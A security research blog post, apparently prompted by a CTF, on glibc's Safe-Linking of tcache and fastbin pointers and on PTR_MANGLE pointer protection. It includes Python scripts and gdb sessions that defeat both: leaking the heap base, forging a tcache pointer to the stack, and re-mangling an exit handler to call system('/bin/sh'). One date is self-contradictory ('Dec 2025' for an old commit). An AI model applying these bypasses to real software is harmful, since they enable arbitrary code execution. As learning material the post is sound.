---
layout: post
title: Libc pointer protections
date: 2025-03-05
classes: wide
tags:
  - Research
  - Exploitation
--- 
<pre style="font-size: clamp(0.17rem, 0.4vw, 1rem); text-align: center">
 ██▓     ██▓ ▄▄▄▄    ▄████▄      ██▓███   ▒█████   ██▓ ███▄    █ ▄▄▄█████▓▓█████  ██▀███      ██▓███   ██▀███   ▒█████  ▄▄▄█████▓▓█████  ▄████▄  ▄▄▄█████▓ ██▓ ▒█████   ███▄    █   ██████ 
▓██▒    ▓██▒▓█████▄ ▒██▀ ▀█     ▓██░  ██▒▒██▒  ██▒▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒   ▓██░  ██▒▓██ ▒ ██▒▒██▒  ██▒▓  ██▒ ▓▒▓█   ▀ ▒██▀ ▀█  ▓  ██▒ ▓▒▓██▒▒██▒  ██▒ ██ ▀█   █ ▒██    ▒ 
▒██░    ▒██▒▒██▒ ▄██▒▓█    ▄    ▓██░ ██▓▒▒██░  ██▒▒██▒▓██  ▀█ ██▒▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒   ▓██░ ██▓▒▓██ ░▄█ ▒▒██░  ██▒▒ ▓██░ ▒░▒███   ▒▓█    ▄ ▒ ▓██░ ▒░▒██▒▒██░  ██▒▓██  ▀█ ██▒░ ▓██▄   
▒██░    ░██░▒██░█▀  ▒▓▓▄ ▄██▒   ▒██▄█▓▒ ▒▒██   ██░░██░▓██▒  ▐▌██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄     ▒██▄█▓▒ ▒▒██▀▀█▄  ▒██   ██░░ ▓██▓ ░ ▒▓█  ▄ ▒▓▓▄ ▄██▒░ ▓██▓ ░ ░██░▒██   ██░▓██▒  ▐▌██▒  ▒   ██▒
░██████▒░██░░▓█  ▀█▓▒ ▓███▀ ░   ▒██▒ ░  ░░ ████▓▒░░██░▒██░   ▓██░  ▒██▒ ░ ░▒████▒░██▓ ▒██▒   ▒██▒ ░  ░░██▓ ▒██▒░ ████▓▒░  ▒██▒ ░ ░▒████▒▒ ▓███▀ ░  ▒██▒ ░ ░██░░ ████▓▒░▒██░   ▓██░▒██████▒▒
░ ▒░▓  ░░▓  ░▒▓███▀▒░ ░▒ ▒  ░   ▒▓▒░ ░  ░░ ▒░▒░▒░ ░▓  ░ ▒░   ▒ ▒   ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░   ▒▓▒░ ░  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░   ▒ ░░   ░░ ▒░ ░░ ░▒ ▒  ░  ▒ ░░   ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░
░ ░ ▒  ░ ▒ ░▒░▒   ░   ░  ▒      ░▒ ░       ░ ▒ ▒░  ▒ ░░ ░░   ░ ▒░    ░     ░ ░  ░  ░▒ ░ ▒░   ░▒ ░       ░▒ ░ ▒░  ░ ▒ ▒░     ░     ░ ░  ░  ░  ▒       ░     ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░░ ░▒  ░ ░
  ░ ░    ▒ ░ ░    ░ ░           ░░       ░ ░ ░ ▒   ▒ ░   ░   ░ ░   ░         ░     ░░   ░    ░░         ░░   ░ ░ ░ ░ ▒    ░         ░   ░          ░       ▒ ░░ ░ ░ ▒     ░   ░ ░ ░  ░  ░  
    ░  ░ ░   ░      ░ ░                      ░ ░   ░           ░             ░  ░   ░                    ░         ░ ░              ░  ░░ ░                ░      ░ ░           ░       ░  
                  ░ ░                                                                                                                   ░                                                  
</pre>
<pre style="font-size: 1vw; text-align: center">                                                                                              
                                                                               
                      @@@@@@@@                                                       
                  @@@@@@@@@@@@@@@@                                                   
                @@@@@@@      @@@@@@@@@@@@@@@@@                                       
               @@@@           @@@@@@@@  @@@@@@@@@                                    
                            @@@@@  @@@@       @@@@@                                  
            @@@           @@@@@     @@@@        @@@@                                 
            @@@@         @@@@        @@@         @@@@                                
            @@@        @@@@@         @@@          @@@@@@@@@@@@                       
            @@@@      @@@@           @@@        @@@@@@@  @@@@@@@                     
            @@@@     @@@@        @@@@@@@@@@@@  @@@@ @@@      @@@@                    
             @@@@  @@@@@     @@@@@@@@@@@@@@@@@@@@@  @@@        @@                    
              @@@@@@@@@@@@@@@@@@@@  @@@@    @@@@@@@ @@@                              
              @@@@@@@@@@@@@@@@@@@@@@@@@      @@@@@@@@@@@         @@@                 
            @@@@@@@@@@ @@@@@    @@@@@@@      @@@  @@@@@@         @@@@                
          @@@@@    @@@@@@@         @@@@@    @@@@    @@@@@         @@@                
         @@@@       @@@@@          @@@@@@@@@@@@@     @@@@         @@@@               
        @@@@        @@@@@@      @@@@@@@@@@@@@@@@@@@   @@@          @@@               
       @@@@        @@@@@@@@@@@@@@@@@@  @@@@  @@@@@@@@@@@@@         @@@@    @@@       
      @@@@        @@@@@@@@@@@@@@  @@@   @@@   @@@ @@@@@@@@@        @@@@    @@@@@     
      @@@@        @@@@@@@@@@      @@@   @@@   @@@@   @@@@@@@       @@@@      @@@@    
      @@@     @@@@@@@@@  @@@@    @@@@   @@@@   @@@@     @@@@@@@    @@@@       @@@@@  
@@@@@@@@@@@@@@@@@@@@      @@@@   @@@@    @@@    @@@     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@  @@@@      @@@@   @@@@    @@@    @@@@@  @@@@     @@@@@@@@@@@@@@@@@@@@@
      @@@       @@@@       @@@   @@@@    @@@      @@@@ @@@@        @@@@        @@@@@ 
      @@@@      @@@@       @@@@  @@@@   @@@@       @@@@@@@         @@@       @@@@@   
       @@@      @@@@       @@@    @@@   @@@         @@@@@         @@@@     @@@@@     
       @@@@@    @@@@      @@@@    @@@ @@@@@          @@@@         @@@      @@@       
        @@@@@    @@@      @@@@    @@@@@@@           @@@@@        @@@@                
          @@@@@@ @@@@   @@@@@      @@@@@          @@@@@@@@       @@@@                
            @@@@@@@@@@@@@@@      @@@@@@          @@@@ @@@@      @@@@                 
               @@@@@@@@@@       @@@@@@@@@     @@@@@@  @@@@     @@@@                  
                   @@@@        @@@@   @@@@@@@@@@@@    @@@     @@@@                   
                    @@@@       @@@       @@@@@      @@@@@    @@@@                    
                     @@@@      @@@@               @@@@@     @@@@                     
                      @@@@@     @@@@@@@        @@@@@@     @@@@@                      
                        @@@@@     @@@@@@@@@@@@@@@@@    @@@@@@                        
                         @@@@@@@       @@@@@@@      @@@@@@@                          
                            @@@@@@@@@             @@@@@@                             
                               @@@@@@@@@@@@@@@@   @@                                 
                                     @@@@@@@@@                                       
                                                                            
</pre>

## Introduction

I was playing a CTF a couple weekends ago and I stumble upon this heap-style challenge that was linked to a modern libc. This was my first time dealing with modern libc versions, so naturally I stumbled upon a couple new (to me) protections.

Unfortunately, I couldn't finish the challenge in time and that spiked my curiosity about them.

So in this blog post, I'll talk about my research about the libc pointer protections introduced in 2 fields:

* Heap single-linked lists
* Addresses used internally by libc

## Heap pointers

Commit [a1a486d70ebcc47a686ff5846875eacad0940e41](https://sourceware.org/git/?p=glibc.git;a=commit;h=a1a486d70ebcc47a686ff5846875eacad0940e41) introduced `Safe-Linking` into the heap single-linked lists, in particular to the tcache and the fastbins in 2020.

From the commit message:

```
Safe-Linking is a security mechanism that protects single-linked
lists (such as the fastbin and tcache) from being tampered by attackers.
The mechanism makes use of randomness from ASLR (mmap_base), and when
combined with chunk alignment integrity checks, it protects the "next"
pointers from being hijacked by an attacker.
...
The design assumes an attacker doesn't know where the heap is located,
and uses the ASLR randomness to "sign" the single-linked pointers. We
mark the pointer as P and the location in which it is stored as L, and
the calculation will be:
  * PROTECT(P) := (L >> PAGE_SHIFT) XOR (P)
  * *L = PROTECT(P)
```

This translate in two macros, `PROTECT_PTR` and `REVEAL_PTR`, defined in [malloc.c](https://elixir.bootlin.com/glibc/glibc-2.41/source/malloc/malloc.c#L329) that are called whenever a pointer is written and retrieved, respectively.

```c
#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
```

Let's break down this process, first by understantding how a pointer is encoded:

`pos` represents, as the commit message says, the address where pointer will be stored and `ptr` is the pointer address itself.

First, we get the address (`pos`) and shift it 12 bits.
If assuming a page size of 4096, this effectively extracts the page of the memory address.

`0x555555559af0` will turn into `0x555555559`

After than, we xor the value with the pointer value to obtain the protected pointer.

Revealing the original pointer works the same way, by simply rerunning the operation.

### Example

Let's look at an example. We have a heap at `0x555555559000` with 2 free chunks:

```c
0x555555559000	0x0000000000000000	0x0000000000000291	................
0x555555559010	0x0000000000020000	0x0000000000000000	................
...
0x555555559ab0	0x0000000000000000	0x0000000000000031	........1.......
0x555555559ac0	0x0000000555555559	0x990bee95285d21f8	YUUU.....!](....	 <-- tcachebins[0x30][1/2]
0x555555559ad0	0x0000000000000000	0x0000000000000000	................
0x555555559ae0	0x0000000000000000	0x0000000000000031	........1.......
0x555555559af0	0x000055500000cf99	0x990bee95285d21f8	....PU...!](....	 <-- tcachebins[0x30][0/2]
0x555555559b00	0x0000000000000000	0x0000000000000000	................
0x555555559b10	0x0000000000000000	0x00000000000204f1	................	 <-- Top chunk
```

Picking the last one, we can see an FD of `0x55500000cf99`, that we know points to `0x555555559ac0`.
Let's reveal it:

* `0x555555559af0` >> `12` -> `0x555555559`
* `0x555555559` ^ `0x55500000cf99` -> `0x555555559ac0`

### Exploitation perspective

From an exploitation perspective, this means we need to leak a heap address to defeat this protection.

I'm sure you noticed the different value in `tcachebins[0x30][1/2]` and this is a very useful one. The first one to be linked into the fastbins or the tcache will have a forward pointer with value 0. When we perform the `PROTECT_PTR`, we are performing xor over 0, which results in the original address.

All we need to do is shift the bytes back to obtain the base of the heap! `0x555555559` -> `0x555555559000`.
This is not always 100% true, if the chunk sits in a different page then that's what we will retrieve. Nevertheless, doing the math to figure out where the chunk is compared to the beginning of the heap shouldn't be too hard, if controlling the allocations.

With this information, preparing our own pointers is just a matter of keeping track where our chunk will live. Since we only care about the page address, we only need to worry when our chunk is placed in a new page, to properly increase the heap leak.

Following the example before, and for the sake of showing how it works, let's say we want to write in the stack, at `0x7ffffffde100`.

We can protect our fake pointer: `0x555555559` ^ `0x7ffffffde100` -> `0x7ffaaaa8b459`.
Now we write that into the FD:

```c
0x555555559ae0	0x0000000000000000	0x0000000000000031	........1.......
0x555555559af0	0x00007ffaaaa8b459	0x990bee95285d21f8	Y........!](....	 <-- tcachebins[0x30][0/2]
0x555555559b00	0x0000000000000000	0x0000000000000000	................
0x555555559b10	0x0000000000000000	0x00000000000204f1	................	 <-- Top chunk
```

```c
pwndbg> bins
tcachebins
0x30 [  2]: 0x555555559af0 —▸ 0x7ffffffde100 ◂— 0x7ffffffde
```

And as you can see, with pwndbg we can already check that it indeed points to `0x7ffffffde100`. Otherwise, allocating one for the first on the list and another one finally for the one we are targetting will reveal that we indeed allocate a chunk in our target address.

As mentioned, `fastbins` will apply too:

```c
0x555555559ab0	0x0000000000000000	0x0000000000000021	........!.......
0x555555559ac0	0x0000000555555559	0xc4d708284c02606d	YUUU....m`.L(...	 <-- tcachebins[0x20][1/2]
0x555555559ad0	0x0000000000000000	0x0000000000000021	........!.......
0x555555559ae0	0x000055500000cf99	0xc4d708284c02606d	....PU..m`.L(...	 <-- tcachebins[0x20][0/2]
0x555555559af0	0x0000000000000000	0x0000000000000021	........!.......	 <-- fastbins[0x20][0]
0x555555559b00	0x0000000555555559	0x0000000000000000	YUUU............
0x555555559b10	0x0000000000000000	0x00000000000204f1	................	 <-- Top chunk
```

Note that `0x0000000555555559` is both in fastbins list and tcachebins list, as it is 0 in both cases (and the page address is still the same)


> If you noticed that in my program the last chunk went to fastbins instead of the tcache for 0x20 (since the max amount is 7), this is because you can influence tcache parameters at run time like this one, with GLIBC_TUNABLES (remember CVE-2023-4911? ;) 
> For this particular case, I used: `export GLIBC_TUNABLES=glibc.malloc.tcache_count=2`

Now, what if we cannot retrieve the special 0 case? Do not worry, as it is not much a problem either.

Let's get the case from before, `0x55500000cf99` that we know points to `0x555555559ac0`.

We know:

* The top 3 values, due to the fact of the shift (>> 12), those are always the real values from the pointer value.
* The next 3, we can figure out, as we know it will be the 3 values from before due to the shift: (NEXT_TOP_3 XOR TOP_3)

Now with `0x55500000cf99`:

* `0x555` -> Top 3 real values from the pointer value
* `0x000` = `0x555` XOR `0x???` => `0x000` XOR `0x555` => `0x555`

The remaining `0x00cf99` we need to bruteforce, but we only care about the shifted version, so only `0x00c`. 

How do we bruteforce? Well, at this point, we will rely on the fact that we know how far the pointer address is from the actual address.
If we can control the allocations and we know the size and where they are going to be in memory, we can offset one value with the other, so we only have one address to figure out.

Even in the case we don't have full control of it, as long as we stay on the same page address, we will be able to extract it.

This is an example with a Python script for the case above:

```python
def find_value(result, offset, range_from, range_to):
    for value in range(range_from, range_to, 0x10):  
        value2 = value + offset
        if (value >> 12) ^ value2 == result:
            return value  
    return None

# Example usage:
RESULT = 0x55500000cf99  
OFFSET = -0x20

MASK = RESULT >> (4 * 9)
INPUT = (RESULT >> (4 * 6)) & 0x000fff
TOP6 = (MASK << (4 * 9)) + ((MASK ^INPUT)<<(4*6))
MAX = TOP6 + ((1 << (4 * 6)) - 1)

print(f"Searching from 0x{TOP6:x} to 0x{MAX:x}")
value = find_value(RESULT, OFFSET, TOP6, MAX)
if value is not None:
    print(f"Address: 0x{value:x} Value 0x{value+OFFSET:x}")
else:
    print("No valid VALUE found.")
```

```bash
$ python3 solve.py
Searching from 0x555555000000 to 0x555555ffffff
Address: 0x555555559ae0 Value 0x555555559ac0
```

## General libc addresses

Pointer mangling is used to obfuscate dynamic pointers used by some libc functions. This is handled in libc by the macros `PTR_DEMANGLE` and `PTR_MANGLE`. These were introduced a long time ago, commit [3467f5c369a10ef19c8df38fb282c7763f36d66f](https://sourceware.org/git/?p=glibc.git;a=commit;h=3467f5c369a10ef19c8df38fb282c7763f36d66f) introduced the mangling operations for i386 and x86_64 on Dec 2025. Other commits followed up to use these macros roughly at the same time, like [a3c88553729c1c4dcd4f893a96b4668bce640ee5](https://sourceware.org/git/?p=glibc.git;a=commit;h=a3c88553729c1c4dcd4f893a96b4668bce640ee5) or [915a6c51c5d8127e87ef797ee23e04e4f92b4c4f](https://sourceware.org/git/?p=glibc.git;a=commit;h=915a6c51c5d8127e87ef797ee23e04e4f92b4c4f).

This approach basically aims to defend those addresses that are initially written in memory by libc functions and will later be used again by other libc functions.

`exit` is a very good example of one of those functions. At the beginning, `__on_exit` is called to register a function + args to be called at the end of execution, when `exit` is called.

`__on_exit` will `PTR_MANGLE` the address of the function and `exit` (well, actually `__run_exit_handlers`) will `PTR_DEMANGLE` the function.


`PTR_DEMANGLE/MANGLE` are provided for x86_64 in sysdeps/unix/sysv/linux/x86_64/pointer_guard.h, in assembly, so the path (and code) will vary based on the architecture:

```c
#  define PTR_MANGLE(reg)       xor %fs:POINTER_GUARD, reg;                   \
                                rol $2*LP_SIZE+1, reg
#  define PTR_DEMANGLE(reg)     ror $2*LP_SIZE+1, reg;                        \
                                xor %fs:POINTER_GUARD, reg
```

By disassembling `__on_exit` we can confirm `PTR_MANGLE`:

```c
   0x00007ffff7c496c5 <+85>:	xor    rdi,QWORD PTR fs:0x30
   0x00007ffff7c496ce <+94>:	rol    rdi,0x11
   0x00007ffff7c496d2 <+98>:	mov    QWORD PTR [rax+0x8],rdi
```

and `__run_exit_handlers` shows `PTR_DEMANGLE`:

```c
   0x00007ffff7c47ada <+154>:	ror    rax,0x11
   0x00007ffff7c47ade <+158>:	xor    rax,QWORD PTR fs:0x30
   ...
   0x00007ffff7c47af5 <+181>:	call   rax
```

### Exploitation perspective

From an exploitation perspective, we need to _know_ the key used for the xor operation. This value is a randomized value set in the Thread Control Block, especifically at offset 0x30 [in x86_64](https://elixir.bootlin.com/glibc/glibc-2.40/source/sysdeps/x86_64/nptl/tls.h#L52). 

> Not that it matter from an exploitation perspective, but if you are curious, this value is originally set in `__libc_start_main`, as you can see [here](https://elixir.bootlin.com/glibc/glibc-2.40/source/csu/libc-start.c#L299):
>```c
>  // csu/libc-start.c #L299
>  /* Set up the pointer guard value.  */
>  uintptr_t pointer_chk_guard = _dl_setup_pointer_guard (_dl_random,
>							 stack_chk_guard);
># ifdef THREAD_SET_POINTER_GUARD
>  THREAD_SET_POINTER_GUARD (pointer_chk_guard);
># else
>  __pointer_chk_guard_local = pointer_chk_guard;
># endif
>```

Once we are able to obtain this value, we can write our own mangled pointers. Lucky for us, this area is also writable, which means we can also overwrite it:

```
pwndbg> xinfo $fs_base
Extended information for virtual address 0x7ffff7fa3740:

  Containing mapping:
    0x7ffff7fa3000     0x7ffff7fa6000 rw-p     3000      0 [anon_7ffff7fa3]

  Offset information:
         Mapped Area 0x7ffff7fa3740 = 0x7ffff7fa3000 + 0x740
pwndbg> 
```

So we have two options:
* We read the value and reuse it.
* We overwrite the value and lose the old one.

First option is probably the cleaneast one since that wouldn't corrupt any other demangle operations that may happen before libc uses the pointer we want to overwrite.

In any case, let's see an example with `exit`. First, lets see the value of the key used with the xor operation `fs:0x30`:

```
pwndbg> x/1gx $fs_base + 0x30
0x7ffff7fa3770:	0xd7e12bf4cba2d603
```

`__exit_funcs` are the list of functions we will be calling, you can see it on `exit`:

```c
/*
*   __run_exit_handlers (int status, struct exit_function_list **listp,
		     bool run_list_atexit, bool run_dtors)
*/
  __run_exit_handlers (status, &__exit_funcs, true, true);
```

And the actual structure in gdb:

```c
pwndbg> p *__exit_funcs
$3 = {
  next = 0x0,
  idx = 1,
  fns = {
      flavor = 4,
      func = {
        at = 0xa81678bd4487afc2,
        on = {
          fn = 0xa81678bd4487afc2,
          arg = 0x0
        },
        cxa = {
          fn = 0xa81678bd4487afc2,
          arg = 0x0,
          dso_handle = 0x0
        }
      }
    },
    ...
```

As you can see, currently registered target is `0xa81678bd4487afc2`. 
Let's perform manually the `PTR_DEMANGLE` and `PTR_MANGLE` operation:

```python
def ror(value, bits, size=64):
    """ Rotate right (ROR) operation. 
        value: Integer to rotate
        bits: Number of bits to rotate by
        size: Bit size (default 64-bit for rax)
    """
    mask = (1 << size) - 1  # Create a mask for the given size
    return ((value >> bits) | (value << (size - bits))) & mask

def rol(value, bits, size=64):
    """ Rotate left (ROL) operation.
        value: Integer to rotate
        bits: Number of bits to rotate by
        size: Bit size (default 64-bit for rax)
    """
    mask = (1 << size) - 1  # Create a mask for the given size
    return ((value << bits) | (value >> (size - bits))) & mask

# Demangle operation
mangled = 0xa81678bd4487afc2
rax = mangled
rax = ror(rax, 0x11) 
demangled = rax ^ 0xd7e12bf4cba2d603
print(hex(demangled)) # -> 0x7ffff7fc7440

# Mangle operation
rax = demangled
rax = rax ^ 0xd7e12bf4cba2d603
rax = rol(rax, 0x11)
assert(rax == mangled)
```

We can check this on gdb and confirm it's a valid address, and see that it matches `_dl_fini`:

```c
pwndbg> x/1i 0x7ffff7fc7440
   0x7ffff7fc7440 <_dl_fini>:	endbr64
```

> If you are curious about how _dl_fini ends up there, this happens through __libc_start_main -> __cxa_atexit -> __internal_atexit

Now for the sake of showing the concept, let's point it to `system`:

```python
# Mangle operation
rax = 0x7ffff7c5af30 # system addr
rax = rax ^ 0xd7e12bf4cba2d603
rax = rol(rax, 0x11)
print(hex(rax)) # => 0xa81678cef267afc2
```

```c
  ...
        cxa = {
          fn = 0xa81678cef267afc2,
          arg = 0x555555559c80,
          dso_handle = 0x0
        }
  ...
```

being `0x555555559c80` an address were I wrote `/bin/sh`.

Let's finish the program (so `exit` is called). In `__run_exit_handlers`, we can see that after performing the `PTR_DEMANGLE` operation, we see our `system` address:

`*RAX  0x7ffff7c5af30 (system) ◂— endbr64`

And finally we can see `system` is called with our string:

```c
 ► 0x7ffff7c47bef <__run_exit_handlers+431>    call   rax  <system>
        command: 0x555555559c80 ◂— 0x68732f6e69622f /* '/bin/sh' */
```

```c
pwndbg> c
Continuing.
[Attaching after Thread 0x7ffff7fa3740 (LWP 10964) vfork to child process 12772]
[New inferior 2 (process 12772)]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Detaching vfork parent process 10964 after child exec]
[Inferior 1 (process 10964) detached]
process 12772 is executing new program: /usr/bin/dash
...
```

> Feel free to reach out if you spot any mistakes!

**Happy hacking!**